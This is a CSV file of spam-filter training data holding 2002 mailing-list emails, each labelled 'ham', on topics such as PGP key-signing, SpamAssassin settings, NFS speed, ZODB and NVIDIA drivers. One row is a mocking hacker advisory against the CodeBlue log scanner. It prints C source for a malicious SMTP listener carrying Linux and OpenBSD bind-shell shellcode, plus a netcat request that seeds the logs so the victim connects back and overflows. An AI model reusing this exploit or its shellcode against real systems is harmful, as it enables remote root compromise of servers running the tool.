label,text
ham,"Anyone interested in a pgp/gpg key-signing get-together @ DC,
please email me your key info (name, key ID, type, size,
fingerprint), and I will add you to the list.

If you don't have a PGP key, now is a great time to make one.

Want to find out more about PGP?
<http://www.uk.pgp.net/pgpnet/pgp-faq/>

You can get the software from:

PGPfreeware <http://www.pgpi.org/products/pgp/versions/freeware/>
GnuPG (GPG) <http://www.pgpi.org/download/gnupg/>


Bring the following:

   *  Photo ID (your name must be in your key identity)
   *  A printed copy of your key ID, key type, fingerprint, and key size

I will pass out a master list (from what people send me now). Then
individually we will cross-validate eachothers identities and keys.

It works like this: person A tells B the details of their key (from
their personal copy of the key info). Person B confirms that the key
information on the master list matches. Next person A produces photo ID
for person B. If it proves that person A is the owner of the key, then
person B can check off that person on their list.

The reverse is then done for person B.

After a while you will end up with a list full of (hopefully) checked
names. Later on, you can retrieve a copy of the key either from a
keyserver or directly from the owner, verify it's valid (it matches the
checked off name on your copy of the master list), and sign it using
your private key.

Then you can upload your signature of the key to a key server and send a
copy back to the key's owner to add to thier keyring.

ID:    Mark Renouf <mark@tweakt.net>
Size:  2048
Type:  DH/DSS
KeyID: 0xF888F464
Fingerprint: 9CE7 98DD E14E 8B9C 7109  2798 C18D 83A9 F888 F464

--DeathToSpamDeathToSpamDeathToSpam--


-------------------------------------------------------
This sf.net email is sponsored by:ThinkGeek
Welcome to geek heaven.
http://thinkgeek.com/sf
_______________________________________________
Spamassassin-Sightings mailing list
Spamassassin-Sightings@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/spamassassin-sightings"
ham,"Amis-v or there is another prefs file that SA is using. I had a heck of a time
figuring out where to find my site wide file because of my configuration.

If your using spamd and you want your users to have some control using
user_prefs then check their ~/spamassassin file.
If your using spamd and you have a site wide only policy then make sure that
spamd is started with the -x option.
If you used the -x option then the only place that it should get the rules from
would be from the local.cf in the /etc/mail/spamassassin directory. Assuming a
default install.

Theo Van Dinter wrote:
> 
> On Wed, Jul 24, 2002 at 10:18:28AM -0500, Stewart, John wrote:
> > X-Virus-Scanned: by amavisd-new amavisd-new-20020630
> > X-Spam-Status: No, hits=6.5 tagged_above=5.1 required=6.9 tests=PLING,
> > MONEY_BACK, CLICK_BELOW, POR
> > N_14, CLICK_HERE_LINK, FREQ_SPAM_PHRASE
> > X-Razor-id: d92173a8dfc60567e55efcf6bf264fd7f7a7369a
> >
> > Doesn't hits=6.5 mean that it should be tagged as spam? Why the
> > X-Spam-Status of no then?
> 
> required is 6.9, it only scored 6.5, so it's not spam according to SA.
> 
> > Why is required=6.9 if I have required_hits at 5 in the local.cf? Where the
> > heck does that number come from?
> >
> > Also, what is tagged_above=? I cannot find any information about it on the
> > SpamAssassin site.
> 
> Good questions...  ""tagged_above"" doesn't appear anywhere in SA (at
> least according to `find`).  I would guess it's amavis doing some
> hacking around.
> 
> --
> Randomly Generated Tagline:
> D'oh!  English!  Who needs that?  I'm never going to England. Come on,
>  let's smoke.
> 
>                 -- Homer Simpson, talking Barney into cutting class
>                    The Way We Was
> 
> -------------------------------------------------------
> This sf.net email is sponsored by:ThinkGeek
> Welcome to geek heaven.
> http://thinkgeek.com/sf
> _______________________________________________
> Spamassassin-talk mailing list
> Spamassassin-talk@lists.sourceforge.net
> https://lists.sourceforge.net/lists/listinfo/spamassassin-talk

-- 
========================
Kevin W. Gagel
Network Administrator
College of New Caledonia
gagel@cnc.bc.ca
postmaster@cnc.bc.ca
(250)562-2131 loc. 448
========================

--------------------------------
The College of New Caledonia    
Visit us at http://www.cnc.bc.ca
--------------------------------


-------------------------------------------------------
This sf.net email is sponsored by:ThinkGeek
Welcome to geek heaven.
http://thinkgeek.com/sf
_______________________________________________
Spamassassin-talk mailing list
Spamassassin-talk@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/spamassassin-talk"
ham,"""Hess, Mtodd, /mth"" said:

> I hate to bring this up, but I see more and more spams that contain very
> little, if any, text.  Instead, most of the spam text is in a graphic image.
> How will we be able to detect those as spam?  OCR?

or, alternatively, giveaway patterns in the HTML?  That's what's happening
with most obfuscating techniques the spammers are trying -- they become
a very reliable sign of spam in themselves!

--j.


-------------------------------------------------------
This sf.net email is sponsored by:ThinkGeek
Welcome to geek heaven.
http://thinkgeek.com/sf
_______________________________________________
Spamassassin-talk mailing list
Spamassassin-talk@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/spamassassin-talk"
ham,"TITLE: Potential remote root in CodeBlue log scanner
NAME: DEMI SEX GOD FROM HELL ADV 00001
DATE: YES, PLEASE MAIL ME IF YOU ARE FEMALE (send pictures)
CRAZY TRACKING NUMBER THAT MAKES IT LOOK LIKE I HAVE SOME MASSIVE DATABASE OF
JUAREZ: 7363A64B02

Props to dme@#!

Information
-----------

you may remember me from sweaty nights of passion, or perhaps from yesterday when
i announced the release of a piece of software i wrote (many years ago too
btw).

in general i received no feedback from this, cept from one guy having problems
downloading it (howd that go btw?) and then this:

From: ""Michael""
To: ""'Demi Sex God from Hell'""
Subject: RE: ass the attack spoofing shell

Annoying. Pointless.

well! how very very rude. that really was uncalled for. (propz to dme yo!).
gay, bi or curious, i went to find out more about mystical michael, who is
obviously very important as he is the only one who felt the need to tell me
they didnt like me. it turns out, hes a bit of programmer, with some code
available on his website (www.tenebrous.com). I got codeblue, (btw mystical
mike your auto-download script for you counter gives me a 500 error), a log
checking utility mystical mike wrote and released under the GNU GPL to make
the world a better place.

If this tool is run as root (say nightly from roots crontab) there is a
potential remote root. in any case, regardless of user, there is
always a remote. if codeblue is locally suid, theres many overflows all
throughout it, easy peasy like the girls in st patricks!!!.

Note st patricks is a great place in sydney, playground of the rich and
famous. visit it if you ever visit sydney, tell them i sent you.

so lets have a walk through the code, and get a feel for mystical mike, the
man behind the mystic. (do you wear a crazy robe with a hood like a monk
mike?)

$ cd codeblue
$ ls
CHANGES     COPYING     Makefile    README      codeblue.c
$ head COPYING
                    GNU GENERAL PUBLIC LICENSE
                       Version 2, June 1991

 Copyright (C) 1989, 1991 Free Software Foundation, Inc.
     59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

/* uh-oh */

$ vi codeblue.c
/*
 * $Header: /usr/src/Projects/codeblue/codeblue.c,v 1.1 2001/08/02 20:40:01
 * root Exp root $
 *
 ******************************************************************************************
 *                      -[ G O D  B L E S S  A M E R I C A ]-
 *
 ******************************************************************************************
 *
 *            CodeBlue v5.0 by Michael (mystic@tenebrous.com)
 *  This software is freely distributable under the terms of the GNU/GPL.
 *                    Please see file 'COPYING'

/* god bless america, AND mystical mike! */

....

/* line ~273 */
/*
 * siginal_init:
 * sets up all the signals we'd like
 * to handle specially
 */
void signal_init(void)
{
    struct sigaction sa_old, sa_new;

    /* signal handling */
    sa_new.sa_handler = signal_handler;
    sigemptyset(&sa_new.sa_mask);
    sa_new.sa_flags = 0;
    sigaction(SIGINT, &sa_new, &sa_old);
    sigaction(SIGPIPE, &sa_new, &sa_old);
}

/* shared signal handler doing all sorts of stuff, not very good mike :( */

/* line ~289 */

/*********************************************************************
 * Our close() wrapper
 */
int Close(int sd)
{
    return (close(sd));
}

/* that just made me laugh */

/* line ~661 */

char logline[512]; /* logline is global */

int scan_file(FILE * fp)
{
    char buffer[1024];

....

        fgets(buffer, 1024, fp);

....

        if (found_infected == 1) { /* if it picks up a worm entry in the */
				   /* log this is true */

            strcpy(logline, buffer);

	    /* oh dear */

/* line ~827 */

char reply[512]; /* global */
char whoispath[512] = ""/usr/bin/whois""; /* global */

int main(int argc, char **argv)
{

 	.....

            if (argv[i][0] == '-')
                switch (argv[i][1]) {
                case 'e':{      /* return email address */
                        if ((!argv[i + 1]) || (argv[i + 1][0] == '-'))
                            DieWithRequire(argv[i]);
                        strcpy(reply, argv[i + 1]);
                        break;
                    }
                case 'p':{      /* path to whois binary */
                        if ((!argv[i + 1]) || (argv[i + 1][0] == '-'))
                            DieWithRequire(argv[i]);
                        strcpy(whoispath, argv[i + 1]);
                        break;
                    }

	/* whoops! */


Now, all this is good for a laugh, but unless its suid, not much use :(

CodeBlue will scan apache/squid logfiles looking for code red and nimda log
hits. If it finds a hit, it will connect to the source ip adress of the hit
and send an email warning of infection. Unfortunately, mystical mike was too
far up on his high horse to write something decent.

The function that does this is send_email() (line ~552)

It starts off like this:

int send_email(void)
{
	int sd;
	char *host = malloc(sizeof(char) * 512);

/*  .... silly crap using popen and stuff .... */

	/* host is the infected host from the logfiles
 	 * this will connect to the host on port 25
	 */

    if ((sd = smtp_connect(host)) < SUCCESS)
        return -1;

/* Step 0 - Get initial server response */
    get_smtp_reply(sd);

/* this is the function of interest */

/* line ~345 */
/*********************************************************************
 * fetches a reply from the SMTP server
 */
int get_smtp_reply(int sd)
{
    char response[1024]; /* this is the remote host's mail server buf */

	....


    /*
     * We'll loop infinately, receiving
     * 1 byte at a time until we receive a carriage return
     * or line-feed character, signifying the end of the output
     */
	/* GEE! THAT SOUNDS LIKE A GOOD IDEA MYSTICAL MIKE#@!#@! */

	....

    while (TRUE) {
        if (select((sd + 1), &rset, NULL, NULL, &tv) < 0) {
            if (errno != EINPROGRESS) {
                fprintf(stderr, ""[ ERROR: select() failed: %s\n"",
                        strerror(errno));
                return -1;
            }
        }
        if (recv(sd, (int *) &response[i], 1, RECV_FL) < 0) { /* Hello */
            if (errno == EAGAIN) {
                if (elapsed >= smtp_timeout) {
                    fprintf(stderr, ""[ ERROR: operation timed out\n"");
                    fprintf(log, ""..... ERROR: operation timed out\n"");
                    return -1;
                }
                elapsed++;
                usleep(smtp_timeout * 10000);
                continue;
            } else {
                if (!(flags & FL_BEQUIET))
                    fprintf(stderr, ""[ ERROR: recv() failed: %s\n"",
                            strerror(errno));
                fprintf(log, ""..... ERROR: recv() failed: %s\n"",
                        strerror(errno));
                return -1;
            }
        }
        if ((response[i] == '\n')
            || ((response[i] == '\n') && (response[i + 1] == '\n')))
            break;
        i++; /* come here often baby? */
    }

So slowly but surely, response is overrun, unless it its a newline.


/*
 * hi, this is an exploit that doesnt work. it should be enough of a point in
 * the right direction though. the overflow is in get_smtp_reply(), codeblue.c
 * is pretty damn poor, there are more!!!
 *
 * being in a funny mood one afternoon, i made some software publicly
 * available, the next morning i see this in my mailbox:
 *
 * ------- begin spouting off  ------
 * From mystic@tenebrous.com Mon Jul 22 19:50:46 2002
 * Return-Path:
 * Delivered-To: doe@orbital.wiretapped.net
 * Received: (qmail 2711 invoked from network); 22 Jul 2002 19:50:45 -0000
 * Received: from mail110.mail.bellsouth.net (HELO imf10bis.bellsouth.net)
 * (205.152.58.50)
 *  by orbital.wiretapped.net with SMTP; 22 Jul 2002 19:50:45 -0000
 * Received: from Michaels ([68.16.174.6]) by imf10bis.bellsouth.net
 *         (InterMail vM.5.01.04.19 201-253-122-122-119-20020516) with ESMTP
 *         id <20020722195143.XJOI21884.imf10bis.bellsouth.net@Michaels>
 *         for ; Mon, 22 Jul 2002 15:51:43 -0400
 * From: ""Michael""
 * To: ""'Demi Sex God from Hell'""
 * Subject: RE: ass the attack spoofing shell
 * Date: Mon, 22 Jul 2002 15:50:13 -0400
 * Message-ID: <000101c231b8$fedc7740$0200a8c0@Michaels>
 * MIME-Version: 1.0
 * Content-Type: text/plain;
 *	charset=""us-ascii""
 * Content-Transfer-Encoding: 7bit
 * X-Priority: 3 (Normal)
 * X-MSMail-Priority: Normal
 * X-Mailer: Microsoft Outlook, Build 10.0.2616
 * Importance: Normal
 * X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
 * In-Reply-To:
 * Status: RO
 *
 * Annoying. Pointless.
 *
 * ------- end spouting off -------
 *
 * HOW RUDE!@##@!@#!
 *
 * so i had a visit to www.tenebrous.com, found some software written by this
 * master coder, and here we are now.
 *
 * To use this against a webserver (A) using codeblue.
 *
 * $ printf ""GET /scripts/root.exe\r\n\r\n"" | nc A 80
 *
 * this will add an entry in the access log.
 *
 * ON THE SAME HOST:
 *
 * # ./mystic_anus 25
 *
 * wait a while.
 *
 * when codeblue runs it will pull your ip from the logs, connect to your port
 * 25 and try to send you a mail. because mystic is an idiot, you will get a
 * shell with the openbsd code!!!
 *
 * i like exclamation marks !!!!
 *
 * krad haxxor props: dedmunk (happy now#@!!#@) ph1ll1p, caddis, buo, solace,
 * everyone on #cw , everyone in paris (you have a lovely city, i had a lovely
 * time last weekend, thankyou!!!) dedmunk, everyone at netcraft (esp Mike,
 * hi!), everyone in sydney, dedmunk, everyone i go drinking with, anyone who
 * lives in london, marlinspike (yo!), the woman who sells me my cigarettes in
 * the morning on the way into work, thomas greene, dedmunk, adam, durab, sh00ter.
 *
 * BIG SHOUT OUT TO TOLIMAN AND ZERO SUM, UNDERSTAND!!
 *
 * propz to dme#!@#!@
 *
 * dont forget:
 *
 * $Header: /usr/src/Projects/codeblue/codeblue.c,v 1.1 2001/08/02 20:40:01 root Exp root $
 *
 ******************************************************************************************
 *                      -[ G O D  B L E S S  A M E R I C A ]-                             *
 ******************************************************************************************
 *
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#define OF 2048 /* this is bigger than needed */

/* Optimized the code, now it works better in bad situations */
/* i dont know who wrote this, sorry, if you wrote it, let me know */

char lunix_shellcode[]=
""\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8""
""\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89""
""\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0""
""\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd""
""\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9""
""\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75""
""\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08""
""\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"";


/*
 shell on port 6969/tcp shellcode for OpenBSD by noir
*/

long bsd_shellcode[]=
{
  0x4151c931,0x51514151,0x61b0c031,0x078980cd,
  0x4f88c931,0x0547c604,0x084f8902,0x0647c766,
  0x106a391b,0x5004478d,0x5050078b,0x68b0c031,
  0x016a80cd,0x5050078b,0x6ab0c031,0xc93180cd,
  0x078b5151,0xc0315050,0x80cd1eb0,0xc9310789,
  0x50078b51,0xb0c03150,0x4180cd5a,0x7503f983,
  0x5b23ebef,0xc9311f89,0x89074b88,0x8d51044f,
  0x078b5007,0xc0315050,0x80cd3bb0,0x5151c931,
  0x01b0c031,0xd8e880cd,0x2fffffff,0x2f6e6962,
  0x90416873
};

int main(int argc, char *argv[])
{
	struct 	sockaddr_in sock_in;
	struct 	sockaddr_in sock_out;
	char 	*port = ""25"";
	int 	fd, a;
	int 	len;
	int		opt;
	char bigbuf[OF];
	char *p;
	long lunix_resp = 0xbfffe0ac;
	long bsd_resp = 0xdfbfc068;
	char *moo = ""220 "";

	long resp = lunix_resp;
	char *shellcode = lunix_shellcode;

	printf(""strlen scode = %d\n"", strlen(shellcode));
	if (argc == 2)
		port = argv[1];

	if (argc > 2) {
		fprintf(stderr, ""usege: %s [port]\n"", argv[0]);
		exit(1);
	}

	resp += 8;

	p = bigbuf;
	memcpy(p, moo, 4);
	p += 4;
	memset(p, '\x90', 1020 - strlen(shellcode));
	p += 1020 - strlen(shellcode);
	memcpy(p, shellcode, strlen(shellcode));
	p += strlen(shellcode);
	memcpy(p, &resp, 4);
	p += 4;
	memcpy(p, &resp, 4);
	p += 4;
	memset(p, '\n', 4);

	if ((fd = socket(PF_INET, SOCK_STREAM, 0)) < 0){
		perror(""socket"");
		exit(1);
	}

	memset(&sock_in, 0, sizeof(sock_in));
	sock_in.sin_family = AF_INET;
	sock_in.sin_port = htons(atoi(port));
	sock_in.sin_addr.s_addr = INADDR_ANY;
	len = sizeof(sock_in);

	opt = 1;
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int)) == -1) {
			perror(""setsockopt"");
			exit(1);
	}

	if (bind(fd, (struct sockaddr *)&sock_in, len) < 0) {
		perror(""bind"");
		exit(1);
	}

	if (listen(fd, 5) < 0) {
		perror(""listen"");
		exit(1);
	}

	printf(""listening on port %d\n"", atoi(port));

	for (;;) {
		len = sizeof(sock_out);
		if ((a = accept(fd, (struct sockaddr *)&sock_out, &len)) < 0){
			perror(""accept"");
			exit(1);
		}
		printf(""got a connection from %s\n"", inet_ntoa(sock_out.sin_addr));
		fflush(stdout);

		write(a, bigbuf, sizeof(bigbuf));
		close(a);
	}

	return(1);

}"
ham,"NFS as a protocol is not known for its speediness but this is absurd. I did an 
NFS install of a box this morning (that would be the box which won't boot 
from CD for those who were in IRC) and it was rather slow but I just left it 
to it. Having got it up, I want to copy the DVD to a disk on it so I have it 
handy for installing any further bits I might require. So I simply mounted 
the NFS exported DVD on the new box and started copying. 

After a couple of minutes I looked - it was transferring about 8MB a MINUTE. 
So I killed that and used rsync instead which is ticking away now at about 
100 MB/min - still not exactly turbo charged but a lot better than the NFS 
rate. Any ideas as to what's making it SO slow ? There's really no point in 
running more nfsd processes, as there is exactly one client, so I'm a little 
at a loss I must say.



Niall

-- 
Irish Linux Users' Group: ilug@linux.ie
http://www.linux.ie/mailman/listinfo/ilug for (un)subscription information.
List maintainer: listmaster@linux.ie"
ham,"http://news.bbc.co.uk/1/hi/england/2515127.stm

A bizarre collection of stuffed animals could fetch up to £2m when it is
sold by a Cornwall museum.
The Museum of Curiosities is home to a menagerie of 10,000 Victorian stuffed
animals.
The museum, next to the Jamaica Inn on Bodmin Moor, gets about 30,000
visitors a year.
But now the inn's owner Kevin Moore has decided to sell.

Stuffed frogs are for sale

Mr Moore said: ""It was very fashionable to have taxidermy on your
mantlepiece in Victorian times, but it is not really in favour now.""
Nevertheless, figures of up to £2m for the collection have been discussed.
The museum was opened in 1861 by taxidermist Walter Potter.
Tableaux include a kittens tea party, cricket-playing guinea pigs and
swinging frogs.


------------------------ Yahoo! Groups Sponsor ---------------------~-->
Share the magic of Harry Potter with Yahoo! Messenger
http://us.click.yahoo.com/4Q_cgB/JmBFAA/46VHAA/7gSolB/TM
---------------------------------------------------------------------~->

To unsubscribe from this group, send an email to:
forteana-unsubscribe@egroups.com

 

Your use of Yahoo! Groups is subject to http://docs.yahoo.com/info/terms/"
ham,"> >-- be careful when using this one.) Also, that really cute thing 
that
> >Japanese AV girls do of leaving their panties on one leg while 
making love

Dare I ask what a Japanese ""AV girl"" is? 
timh


------------------------ Yahoo! Groups Sponsor ---------------------~-->
4 DVDs Free +s&p Join Now
http://us.click.yahoo.com/pt6YBB/NXiEAA/46VHAA/7gSolB/TM
---------------------------------------------------------------------~->

To unsubscribe from this group, send an email to:
forteana-unsubscribe@egroups.com

 

Your use of Yahoo! Groups is subject to http://docs.yahoo.com/info/terms/"
ham,">>>>> ""SM"" == Skip Montanaro <skip@pobox.com> writes:

  Jeremy> Put another way, I'd be interested to hear why you don't
  Jeremy> want to use ZODB.

  SM> Disclaimer: I'm not saying I don't want to use ZODB.  I'm
  SM> offering some reasons why it might not be everyone's obvious
  SM> choice.

But you're not saying you do want to use ZODB, so you're still part of
the problem <wink>.

  SM> For most of us who have *any* experience with ZODB it's probably
  SM> all indirect via Zope, so there are probably some inaccurate
  SM> perceptions about it.  These thoughts that have come to my mind
  SM> at one time or another:

  SM> * How could a database from a company (Zope) whose sole business
  SM>       is not databases be more reliable than a database from
  SM>       organizations whose sole raison d'etre is databases
  SM>       (Sleepycat, Postgres, MySQL, ...)?

I don't think I could argue that ZODB is more reliable that
BerkeleyDB.  It's true that we have fewer database experts and expend
fewer resources working on database reliability.  On the other hand,
Barry is nearly finished with a BerkeleyDB-based storage for ZODB.

ZODB is an object persistence tool that uses a database behind it.
You can use our FileStorage or you can use someone else's database,
although BerkeleyDB is the best we can offer at the moment.  (It would
be really cool to do a Postgres storage...)

  SM> * Dealing with Zope's monolithic system is frustrating to people
  SM>       (like me) who are used to having files reside in
  SM>       filesystems.  Some of that frustration probably carries
  SM>       over to ZODB, though it's almost certainly not ZODB's
  SM>       problem.


This sounds like a Zope complaint that doesn't have anything to do
with ZODB, but maybe I misunderstand you.  You don't have to store
your code in the database, although that will be mostly possible in
ZODB4.

Seriously, ZODB stores object pickles in a database.  The storage
layer is free to manage those pickles however it likes.  FileStorage
uses a single file.  Toby Dickenson's DirectoryStorage represents each
pickle as a separate file.

  SM> * It seems to grow without bound, else why do I need to pack my
  SM>       Data.fs file every now and then?

It grows without bound unless you pack it.  Why is that a problem? 
BerkeleyDB log files grow without bound, too.  Databases require some
tending.  One possibility with FileStorage is to add an explicit
pack() call to update training operation.  We'd need to think
carefully about the performance impact.

  SM> Also, there is the issue of availability.  While it's just an
  SM> extra install, its use requires more than the usual Python
  SM> install.  Having it in the core distribution would provide
  SM> stronger assurances that it runs wherever Python runs (e.g.,
  SM> does it run on MacOS 8 or 9, both of which I believe Jack still
  SM> supports with his Mac installer?).

I think we'd want a spambayes installer that packaged up spambayes,
python, and zodb.

Jeremy


_______________________________________________
Spambayes mailing list
Spambayes@python.org
http://mail.python.org/mailman/listinfo/spambayes"
ham,"So then, ""Mark Hammond"" <mhammond@skippinet.com.au> is all like:

> So, given that, ZODB is sounding attractive.  I would package it up, so a
> few hundred extra K is probably no big deal.  The code could fall back to
> the slow-loading pickles, so people running from source still work, just
> possibly not as well.

I haven't used ZODB much really but it sure looks like the Right Way.  I
don't think it will fly with the unwashed Unix masses, but it sounds
like a piece of cake with the Windows crowd.  That makes sense; you only
have one OS vendor and one processor family to support.

I'm going to go sulk in /dev/corner now.

Neale

_______________________________________________
Spambayes mailing list
Spambayes@python.org
http://mail.python.org/mailman/listinfo/spambayes"
ham,"Hi there,

Now this is probably of no use to you whatsoever, but...

Not a deb-head, but I also have a problem regards NVidia. I've two machines,
pretty much the same hardware. 
athlon 1700XP's, both have NVidia cards, one Gforce3 Ti and a Gforce2MX,
both use the same driver module. 

Both have same kernel version albeit it compiled for their particular
hardware.

One works perfectly, the other fails to load. When I check with lsmod, I can
see the NVdriver is loaded, but not used ;--(
Thus when I startx, it bombs out. 

IU still have X with the default nv driver and crappy accelleration -->
650fps with glxgears [should be over 2000fps]
Its not a hardware issue with the cards as I swapped them over and get the
same symptoms. 

I reckon my mobo is cack, I've tried swapping slots around, reserving
resources etc all to no avail. 
Should there be an interrupt for the nv card? I haven't checked the other
box yet.

Regards,
CW

-------------------
On Tue, 03 Dec 2002, Mark Page wrote:

> Was running Debian Woody perfectly well until I installed the NVIDIA 3D 
> tar packages.

You probably stil are ;)

> Both the kernel and GLX packages installed with no problem and I then 
> amended the XFree config file appropriately (according to all 
> instructions). Neither GDM nor KDM will now fire up returning me to the 
> console screen. 

ie X is broken. 

> Running startx I isolated the problem to a failure to load the nvidia
> kernel module - By cd'ing to the kernel module file and re-running 'make
> install' I can get a workable xserver 

so you fixed X.

> minus the preferences you would get from either gdm or kdm and to be
> honest the GUI is horrible.

If X is working and you get a brief Nvidia splash screen then this is
likely nothing to do with the driver itself.  You should be able to use kdm
or gdm with the nvidia Xserver.  What exactly did you change in your
XF86Config?  Will gdm/kdm not start?

> I followed the nvidia suggestion of 'make install 
> SYSINCLUDE=/path/to/kernel/headers' and whilst this appears to install 
> ok upon reboot I am back to the same console login and having to go 
> through the same reinstall of the kernel module. I have tried rewriting 
> the XF config file to it's original state with no success.

Well, this sounds like the NVIDIA kernel module isn't loading on boot.
When it *is* working do a quick 

/sbin/lsmod

and look for the module name (something like 'NVDriver').  Then put this on
a new line in 

/etc/modules

in order that linux will load it on boot.  You can just do

modprobe nvdriver

to load it by hand.  Your make install did this as well as reinstalling the
driver in /lib etc.  You should also get a message saying loading the
nvidia driver taints your kernel (which it does, in the sense that it's not
open source).

> Is this a problem anyone else has encountered and what is the best 
> solution? Can I rid myself of the tar file installations and find some 
> specific .deb packages?

The nvidia driver source is in the Woody tree.

http://packages.debian.org/stable/x11/nvidia-kernel-src.html

so you can do

apt-get install nvidia-kernel-src

and then compile, although I've always gone the route you're doing now.

Ideally the nvidia driver would be a part of the kernel from day 1.
However, nvidia have not open sourced it (most of the above source is
pre-compiled object code), but in order for it to work with your specific
kernel you must compile against your kernel headers (as you did).  As
debian has lots of potential kernels they can't have one nvdriver package
and have chosen instead to provide the source.  Actually I don't know if
they're permitted to distribute binaries by nvidia's license anyway.

Gavin

-- 
Irish Linux Users' Group: ilug@linux.ie
http://www.linux.ie/mailman/listinfo/ilug for (un)subscription information.
List maintainer: listmaster@linux.ie

-- 
Irish Linux Users' Group: ilug@linux.ie
http://www.linux.ie/mailman/listinfo/ilug for (un)subscription information.
List maintainer: listmaster@linux.ie"
